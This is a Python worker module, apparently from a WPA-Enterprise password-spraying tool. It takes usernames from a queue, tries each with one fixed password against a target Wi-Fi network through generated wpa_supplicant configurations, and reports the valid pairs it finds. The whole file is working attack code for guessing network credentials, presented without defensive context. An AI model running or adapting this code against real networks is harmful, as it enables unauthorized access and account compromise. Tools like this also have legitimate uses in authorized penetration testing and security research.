from core.wpa_supplicant_conf import WPASupplicantConf
from core.wpa_supplicant import WPA_Supplicant
from threading import Thread

class Worker(object):

    def __init__(self, interface, essid, password, input_queue, output_queue, conf_dir):

        args = (
            interface,
            essid,
            password,
            conf_dir,
            input_queue,
            output_queue,
        )
        self.thread = Thread(target=self._start, args=args)

    @staticmethod
    def _start(interface, essid, password, conf_dir, input_queue, output_queue):

        while True:

            identity = input_queue.get()
            if identity is None:
                return

            print('[%s] Trying credentials: %s:%s@%s' % (interface, identity, password, essid))

            wpa_supplicant_conf = WPASupplicantConf(essid, identity, password, conf_dir)
            wpa_supplicant_conf.write()

            wpa_supplicant = WPA_Supplicant(interface, wpa_supplicant_conf)
            if wpa_supplicant.test_creds():
                print()
                print('[%s] FOUND ONE: %s:%s@%s' % (interface, identity, password, essid))
                print()
                output_queue.put('%s:%s@%s' % (identity, password, essid))
            else:
                print()
                print('[%s] Password invalid.' % (interface))
                print()

            wpa_supplicant_conf.remove()

    def start(self):
        self.thread.start()

    def join(self):
        self.thread.join()
